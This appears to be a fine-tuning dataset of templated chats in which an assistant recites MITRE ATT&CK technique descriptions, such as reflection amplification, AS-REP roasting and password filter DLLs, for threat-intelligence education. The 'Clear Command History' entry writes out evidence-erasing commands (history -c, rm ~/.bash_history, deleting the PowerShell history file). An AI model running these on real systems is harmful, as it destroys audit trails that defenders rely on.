{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Reflection Amplification' and with the Id: T1498.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Reflection Amplification' and with the Id: T1498.002 is described as follows: Adversaries may attempt to cause a denial of service (DoS) by reflecting a high-volume of network traffic to a target. This type of Network DoS takes advantage of a third-party server intermediary that hosts and will respond to a given spoofed source IP address. This third-party server is commonly termed a reflector. An adversary accomplishes a reflection attack by sending packets to reflectors with the spoofed address of the victim. Similar to Direct Network Floods, more than one system may be used to conduct the attack, or a botnet may be used. Likewise, one or more reflectors may be used to focus traffic on the target.(Citation: Cloudflare ReflectionDoS May 2017) This Network DoS attack may also reduce the availability and functionality of the targeted system(s) and network.Reflection attacks often take advantage of protocols with larger responses than requests in order to amplify their traffic, commonly known as a Reflection Amplification attack. Adversaries may be able to generate an increase in volume of attack traffic that is several orders of magnitude greater than the requests sent to the amplifiers. The extent of this increase will depending upon many variables, such as the protocol in question, the technique used, and the amplifying servers that actually produce the amplification in attack volume. Two prominent protocols that have enabled Reflection Amplification Floods are DNS(Citation: Cloudflare DNSamplficationDoS) and NTP(Citation: Cloudflare NTPamplifciationDoS), though the use of several others in the wild have been documented.(Citation: Arbor AnnualDoSreport Jan 2018)  In particular, the memcache protocol showed itself to be a powerful protocol, with amplification sizes up to 51,200 times the requesting packet.(Citation: Cloudflare Memcrashed Feb 2018). The systems targeted by this attack pattern are: Windows, Azure AD, Office 365, SaaS, IaaS, Linux, macOS, Google Workspace ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Password Filter DLL' and with the Id: T1556.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Password Filter DLL' and with the Id: T1556.002 is described as follows: Adversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated. Windows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as DLLs containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts. Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation. Adversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made.(Citation: Carnal Ownage Password Filters Sept 2013). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Terminal Services DLL' and with the Id: T1505.005 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Terminal Services DLL' and with the Id: T1505.005 is described as follows: Adversaries may abuse components of Terminal Services to enable persistent access to systems. Microsoft Terminal Services, renamed to Remote Desktop Services in some Windows Server OSs as of 2022, enable remote terminal connections to hosts. Terminal Services allows servers to transmit a full, interactive, graphical user interface to clients via RDP.(Citation: Microsoft Remote Desktop Services)[Windows Service](https://attack.mitre.org/techniques/T1543/003)s that are run as a \"generic\" process (ex: <code>svchost.exe</code>) load the service's DLL file, the location of which is stored in a Registry entry named <code>ServiceDll</code>.(Citation: Microsoft System Services Fundamentals) The <code>termsrv.dll</code> file, typically stored in `%SystemRoot%\\System32\\`, is the default <code>ServiceDll</code> value for Terminal Services in `HKLM\\System\\CurrentControlSet\\services\\TermService\\Parameters\\`.Adversaries may modify and/or replace the Terminal Services DLL to enable persistent access to victimized hosts.(Citation: James TermServ DLL) Modifications to this DLL could be done to execute arbitrary payloads (while also potentially preserving normal <code>termsrv.dll</code> functionality) as well as to simply enable abusable features of Terminal Services. For example, an adversary may enable features such as concurrent [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) sessions by either patching the <code>termsrv.dll</code> file or modifying the <code>ServiceDll</code> value to point to a DLL that provides increased RDP functionality.(Citation: Windows OS Hub RDP)(Citation: RDPWrap Github) On a non-server Windows OS this increased functionality may also enable an adversary to avoid Terminal Services prompts that warn/log out users of a system when a new RDP session is created.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'AppleScript' and with the Id: T1059.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'AppleScript' and with the Id: T1059.002 is described as follows: Adversaries may abuse AppleScript for execution. AppleScript is a macOS scripting language designed to control applications and parts of the OS via inter-application messages called AppleEvents.(Citation: Apple AppleScript) These AppleEvent messages can be sent independently or easily scripted with AppleScript. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely.Scripts can be run from the command-line via <code>osascript /path/to/script</code> or <code>osascript -e \"script here\"</code>. Aside from the command line, scripts can be executed in numerous ways including Mail rules, Calendar.app alarms, and Automator workflows. AppleScripts can also be executed as plain text shell scripts by adding <code>#!/usr/bin/osascript</code> to the start of the script file.(Citation: SentinelOne AppleScript)AppleScripts do not need to call <code>osascript</code> to execute. However, they may be executed from within mach-O binaries by using the macOS [Native API](https://attack.mitre.org/techniques/T1106)s\u00a0<code>NSAppleScript</code>\u00a0or\u00a0<code>OSAScript</code>, both of which execute code independent of the <code>/usr/bin/osascript</code> command line utility.Adversaries may abuse AppleScript to execute various behaviors, such as interacting with an open SSH connection, moving to remote machines, and even presenting users with fake dialog boxes. These events cannot start applications remotely (they can start them locally), but they can interact with applications if they're already running remotely. On macOS 10.10 Yosemite and higher, AppleScript has the ability to execute [Native API](https://attack.mitre.org/techniques/T1106)s, which otherwise would require compilation and execution in a mach-O binary file format.(Citation: SentinelOne macOS Red Team) Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via [Python](https://attack.mitre.org/techniques/T1059/006).(Citation: Macro Malware Targets Macs). The systems targeted by this attack pattern are: macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Browser Extensions' and with the Id: T1176 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Browser Extensions' and with the Id: T1176 is described as follows: Adversaries may abuse Internet browser extensions to establish persistent access to victim systems. Browser extensions or plugins are small programs that can add functionality and customize aspects of Internet browsers. They can be installed directly or through a browser's app store and generally have access and permissions to everything that the browser can access.(Citation: Wikipedia Browser Extension)(Citation: Chrome Extensions Definition)Malicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores so it may not be difficult for malicious extensions to defeat automated scanners.(Citation: Malicious Chrome Extension Numbers) Depending on the browser, adversaries may also manipulate an extension's update url to install updates from an adversary controlled server or manipulate the mobile configuration file to silently install additional extensions.Previous to macOS 11, adversaries could silently install browser extensions via the command line using the <code>profiles</code> tool to install malicious <code>.mobileconfig</code> files. In macOS 11+, the use of the <code>profiles</code> tool can no longer install configuration profiles, however <code>.mobileconfig</code> files can be planted and installed with user interaction.(Citation: xorrior chrome extensions macOS)Once the extension is installed, it can browse to websites in the background, steal all information that a user enters into a browser (including credentials), and be used as an installer for a RAT for persistence.(Citation: Chrome Extension Crypto Miner)(Citation: ICEBRG Chrome Extensions)(Citation: Banker Google Chrome Extension Steals Creds)(Citation: Catch All Chrome Extension)There have also been instances of botnets using a persistent backdoor through malicious Chrome extensions for [Command and Control](https://attack.mitre.org/tactics/TA0011).(Citation: Stantinko Botnet)(Citation: Chrome Extension C2 Malware) Adversaries may also use browser extensions to modify browser permissions and components, privacy settings, and other security controls for [Defense Evasion](https://attack.mitre.org/tactics/TA0005).(Citation: Browers FriarFox)(Citation: Browser Adrozek) . The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Service Exhaustion Flood' and with the Id: T1499.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Service Exhaustion Flood' and with the Id: T1499.002 is described as follows: Adversaries may target the different network services provided by systems to conduct a denial of service (DoS). Adversaries often target the availability of DNS and web services, however others have been targeted as well.(Citation: Arbor AnnualDoSreport Jan 2018) Web server software can be attacked through a variety of means, some of which apply generally while others are specific to the software being used to provide the service.One example of this type of attack is known as a simple HTTP flood, where an adversary sends a large number of HTTP requests to a web server to overwhelm it and/or an application that runs on top of it. This flood relies on raw volume to accomplish the objective, exhausting any of the various resources required by the victim software to provide the service.(Citation: Cloudflare HTTPflood)Another variation, known as a SSL renegotiation attack, takes advantage of a protocol feature in SSL/TLS. The SSL/TLS protocol suite includes mechanisms for the client and server to agree on an encryption algorithm to use for subsequent secure connections. If SSL renegotiation is enabled, a request can be made for renegotiation of the crypto algorithm. In a renegotiation attack, the adversary establishes a SSL/TLS connection and then proceeds to make a series of renegotiation requests. Because the cryptographic renegotiation has a meaningful cost in computation cycles, this can cause an impact to the availability of the service when done in volume.(Citation: Arbor SSLDoS April 2012). The systems targeted by this attack pattern are: Windows, Azure AD, Office 365, SaaS, IaaS, Linux, macOS, Google Workspace ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Compromise Hardware Supply Chain' and with the Id: T1195.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Compromise Hardware Supply Chain' and with the Id: T1195.003 is described as follows: Adversaries may manipulate hardware components in products prior to receipt by a final consumer for the purpose of data or system compromise. By modifying hardware or firmware in the supply chain, adversaries can insert a backdoor into consumer networks that may be difficult to detect and give the adversary a high degree of control over the system. Hardware backdoors may be inserted into various devices, such as servers, workstations, network infrastructure, or peripherals.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Native API' and with the Id: T1106 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Native API' and with the Id: T1106 is described as follows: Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes.(Citation: NT API Windows)(Citation: Linux Kernel API) These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.Adversaries may abuse these OS API functions as a means of executing behaviors. Similar to [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.Native API functions (such as <code>NtCreateProcess</code>) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries.(Citation: OutFlank System Calls)(Citation: CyberBit System Calls)(Citation: MDSec System Calls) For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes.(Citation: Microsoft CreateProcess)(Citation: GNU Fork) This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.(Citation: Microsoft Win32)(Citation: LIBC)(Citation: GLIBC)Higher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.(Citation: Microsoft NET)(Citation: Apple Core Services)(Citation: MACOS Cocoa)(Citation: macOS Foundation)Adversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks.(Citation: Redops Syscalls) Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions via [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001).. The systems targeted by this attack pattern are: Windows, macOS, Linux ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Clear Network Connection History and Configurations' and with the Id: T1070.007 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Clear Network Connection History and Configurations' and with the Id: T1070.007 is described as follows: Adversaries may clear or remove evidence of malicious network connections in order to clean up traces of their operations. Configuration settings as well as various artifacts that highlight connection history may be created on a system and/or in application logs from behaviors that require network connections, such as [Remote Services](https://attack.mitre.org/techniques/T1021) or [External Remote Services](https://attack.mitre.org/techniques/T1133). Defenders may use these artifacts to monitor or otherwise analyze network connections created by adversaries.Network connection history may be stored in various locations. For example, RDP connection history may be stored in Windows Registry values under (Citation: Microsoft RDP Removal):* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default</code>* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers</code>Windows may also store information about recent RDP connections in files such as <code>C:\\Users\\\\%username%\\Documents\\Default.rdp</code> and `C:\\Users\\%username%\\AppData\\Local\\Microsoft\\TerminalServer Client\\Cache\\`.(Citation: Moran RDPieces) Similarly, macOS and Linux hosts may store information highlighting connection history in system logs (such as those stored in `/Library/Logs` and/or `/var/log/`).(Citation: Apple Culprit Access)(Citation: FreeDesktop Journal)(Citation: Apple Unified Log Analysis Remote Login and Screen Sharing)Malicious network connections may also require changes to third-party applications or network configuration settings, such as [Disable or Modify System Firewall](https://attack.mitre.org/techniques/T1562/004) or tampering to enable [Proxy](https://attack.mitre.org/techniques/T1090). Adversaries may delete or modify this data to conceal indicators and/or impede defensive analysis.. The systems targeted by this attack pattern are: Linux, macOS, Windows, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'AS-REP Roasting' and with the Id: T1558.004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'AS-REP Roasting' and with the Id: T1558.004 is described as follows: Adversaries may reveal credentials of accounts that have disabled Kerberos preauthentication by [Password Cracking](https://attack.mitre.org/techniques/T1110/002) Kerberos messages.(Citation: Harmj0y Roasting AS-REPs Jan 2017) Preauthentication offers protection against offline [Password Cracking](https://attack.mitre.org/techniques/T1110/002). When enabled, a user requesting access to a resource initiates communication with the Domain Controller (DC) by sending an Authentication Server Request (AS-REQ) message with a timestamp that is encrypted with the hash of their password. If and only if the DC is able to successfully decrypt the timestamp with the hash of the user\u2019s password, it will then send an Authentication Server Response (AS-REP) message that contains the Ticket Granting Ticket (TGT) to the user. Part of the AS-REP message is signed with the user\u2019s password.(Citation: Microsoft Kerberos Preauth 2014)For each account found without preauthentication, an adversary may send an AS-REQ message without the encrypted timestamp and receive an AS-REP message with TGT data which may be encrypted with an insecure algorithm such as RC4. The recovered encrypted data may be vulnerable to offline [Password Cracking](https://attack.mitre.org/techniques/T1110/002) attacks similarly to [Kerberoasting](https://attack.mitre.org/techniques/T1558/003) and expose plaintext credentials. (Citation: Harmj0y Roasting AS-REPs Jan 2017)(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019) An account registered to a domain, with or without special privileges, can be abused to list all domain accounts that have preauthentication disabled by utilizing Windows tools like [PowerShell](https://attack.mitre.org/techniques/T1059/001) with an LDAP filter. Alternatively, the adversary may send an AS-REQ message for each user. If the DC responds without errors, the account does not require preauthentication and the AS-REP message will already contain the encrypted data. (Citation: Harmj0y Roasting AS-REPs Jan 2017)(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019)Cracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: SANS Attacking Kerberos Nov 2014). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Service Registry Permissions Weakness' and with the Id: T1058 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Service Registry Permissions Weakness' and with the Id: T1058 is described as follows: Windows stores local service configuration information in the Registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe, [PowerShell](https://attack.mitre.org/techniques/T1086), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through Access Control Lists and permissions. (Citation: MSDN Registry Key Security)If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, then adversaries can change the service binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).Adversaries may also alter Registry keys associated with service failure parameters (such as <code>FailureCommand</code>) that may be executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: TrustedSignal Service Failure)(Citation: Twitter Service Recovery Nov 2017). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Virtual Private Server' and with the Id: T1584.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Virtual Private Server' and with the Id: T1584.003 is described as follows: Adversaries may compromise third-party Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. Adversaries may compromise VPSs purchased by third-party entities. By compromising a VPS to use as infrastructure, adversaries can make it difficult to physically tie back operations to themselves.(Citation: NSA NCSC Turla OilRig)Compromising a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers as well as that added by the compromised third-party.. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'AutoHotKey & AutoIT' and with the Id: T1059.010 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'AutoHotKey & AutoIT' and with the Id: T1059.010 is described as follows: Adversaries may execute commands and perform malicious tasks using AutoIT and AutoHotKey automation scripts. AutoIT and AutoHotkey (AHK) are scripting languages that enable users to automate Windows tasks. These automation scripts can be used to perform a wide variety of actions, such as clicking on buttons, entering text, and opening and closing programs.(Citation: AutoIT)(Citation: AutoHotKey)Adversaries may use AHK (`.ahk`) and AutoIT (`.au3`) scripts to execute malicious code on a victim's system. For example, adversaries have used for AHK to execute payloads and other modular malware such as keyloggers. Adversaries have also used custom AHK files containing embedded malware as [Phishing](https://attack.mitre.org/techniques/T1566) payloads.(Citation: Splunk DarkGate)These scripts may also be compiled into self-contained executable payloads (`.exe`).(Citation: AutoIT)(Citation: AutoHotKey). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Reduce Key Space' and with the Id: T1600.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Reduce Key Space' and with the Id: T1600.001 is described as follows: Adversaries may reduce the level of effort required to decrypt data transmitted over the network by reducing the cipher strength of encrypted communications.(Citation: Cisco Synful Knock Evolution)Adversaries can weaken the encryption software on a compromised network device by reducing the key size used by the software to convert plaintext to ciphertext (e.g., from hundreds or thousands of bytes to just a couple of bytes). As a result, adversaries dramatically reduce the amount of effort needed to decrypt the protected information without the key.Adversaries may modify the key size used and other encryption parameters using specialized commands in a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) introduced to the system through [Modify System Image](https://attack.mitre.org/techniques/T1601) to change the configuration of the device. (Citation: Cisco Blog Legacy Device Attacks). The systems targeted by this attack pattern are: Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Clear Command History' and with the Id: T1070.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Clear Command History' and with the Id: T1070.003 is described as follows: In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.On Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of this is that it allows users to go back to commands they've used before in different sessions.Adversaries may delete their commands from these logs by manually clearing the history (<code>history -c</code>) or deleting the bash history file <code>rm ~/.bash_history</code>.  Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to clear command history data (<code>clear logging</code> and/or <code>clear history</code>).(Citation: US-CERT-TA18-106A)On Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the <code>PSReadLine</code> module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.The <code>PSReadLine</code> command history tracks the commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.(Citation: Microsoft PowerShell Command History)Adversaries may run the PowerShell command <code>Clear-History</code> to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the <code>ConsoleHost_history.txt</code> file. Adversaries may also delete the <code>ConsoleHost_history.txt</code> file or edit its contents to hide PowerShell commands they have run.(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics). The systems targeted by this attack pattern are: Linux, macOS, Windows, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Indirect Command Execution' and with the Id: T1202 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Indirect Command Execution' and with the Id: T1202 is described as follows: Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invoking [cmd](https://attack.mitre.org/software/S0106). For example, [Forfiles](https://attack.mitre.org/software/S0193), the Program Compatibility Assistant (pcalua.exe), components of the Windows Subsystem for Linux (WSL), as well as other utilities may invoke the execution of programs and commands from a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), Run window, or via scripts. (Citation: VectorSec ForFiles Aug 2017) (Citation: Evi1cg Forfiles Nov 2017)Adversaries may abuse these features for [Defense Evasion](https://attack.mitre.org/tactics/TA0005), specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of [cmd](https://attack.mitre.org/software/S0106) or file extensions more commonly associated with malicious payloads.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Custom Cryptographic Protocol' and with the Id: T1024 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Custom Cryptographic Protocol' and with the Id: T1024 is described as follows: Adversaries may use a custom cryptographic protocol or algorithm to hide command and control traffic. A simple scheme, such as XOR-ing the plaintext with a fixed key, will produce a very weak ciphertext.Custom encryption schemes may vary in sophistication. Analysis and reverse engineering of malware samples may be enough to discover the algorithm and encryption key used.Some adversaries may also attempt to implement their own version of a well-known cryptographic algorithm instead of using a known implementation library, which may lead to unintentional errors. (Citation: F-Secure Cosmicduke). The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Revert Cloud Instance' and with the Id: T1536 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Revert Cloud Instance' and with the Id: T1536 is described as follows: An adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence. In highly virtualized environments, such as cloud-based infrastructure, this may be accomplished by restoring virtual machine (VM) or data storage snapshots through the cloud management dashboard or cloud APIs.Another variation of this technique is to utilize temporary storage attached to the compute instance. Most cloud providers provide various types of storage including persistent, local, and/or ephemeral, with the ephemeral types often reset upon stop/restart of the VM.(Citation: Tech Republic - Restore AWS Snapshots)(Citation: Google - Restore Cloud Snapshot). The systems targeted by this attack pattern are: IaaS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Replication Through Removable Media' and with the Id: T1091 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Replication Through Removable Media' and with the Id: T1091 is described as follows: Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.Mobile devices may also be used to infect PCs with malware if connected via USB.(Citation: Exploiting Smartphone USB ) This infection may be achieved using devices (Android, iOS, etc.) and, in some instances, USB charging cables.(Citation: Windows Malware Infecting Android)(Citation: iPhone Charging Cable Hack) For example, when a smartphone is connected to a system, it may appear to be mounted similar to a USB-connected disk drive. If malware that is compatible with the connected system is on the mobile device, the malware could infect the machine (especially if Autorun features are enabled).. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Data from Local System' and with the Id: T1005 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Data from Local System' and with the Id: T1005 is described as follows: Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.Adversaries may do this using a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106) as well as a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008), which have functionality to interact with the file system to gather information.(Citation: show_run_config_cmd_cisco) Adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on the local system.. The systems targeted by this attack pattern are: Linux, macOS, Windows, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Deobfuscate/Decode Files or Information' and with the Id: T1140 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Deobfuscate/Decode Files or Information' and with the Id: T1140 is described as follows: Adversaries may use [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.One such example is the use of [certutil](https://attack.mitre.org/software/S0160) to decode a remote access tool portable executable file that has been hidden inside a certificate file.(Citation: Malwarebytes Targeted Attack against Saudi Arabia) Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload.(Citation: Carbon Black Obfuscation Sept 2016)Sometimes a user's action may be required to open it for deobfuscation or decryption as part of [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016). The systems targeted by this attack pattern are: Windows, Linux, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Outlook Rules' and with the Id: T1137.005 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Outlook Rules' and with the Id: T1137.005 is described as follows: Adversaries may abuse Microsoft Outlook rules to obtain persistence on a compromised system. Outlook rules allow a user to define automated behavior to manage email messages. A benign rule might, for example, automatically move an email to a particular folder in Outlook if it contains specific words from a specific sender. Malicious Outlook rules can be created that can trigger code execution when an adversary sends a specifically crafted email to that user.(Citation: SilentBreak Outlook Rules)Once malicious rules have been added to the user\u2019s mailbox, they will be loaded when Outlook is started. Malicious rules will execute when an adversary sends a specifically crafted email to the user.(Citation: SilentBreak Outlook Rules). The systems targeted by this attack pattern are: Windows, Office 365 ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Impair Defenses' and with the Id: T1562 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Impair Defenses' and with the Id: T1562 is described as follows: Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators.Adversaries may also impair routine operations that contribute to defensive hygiene, such as blocking users from logging out of a computer or stopping it from being shut down. These restrictions can further enable malicious operations as well as the continued propagation of incidents.(Citation: Emotet shutdown)Adversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components.. The systems targeted by this attack pattern are: Windows, Office 365, IaaS, Linux, macOS, Containers, Network ."}]}
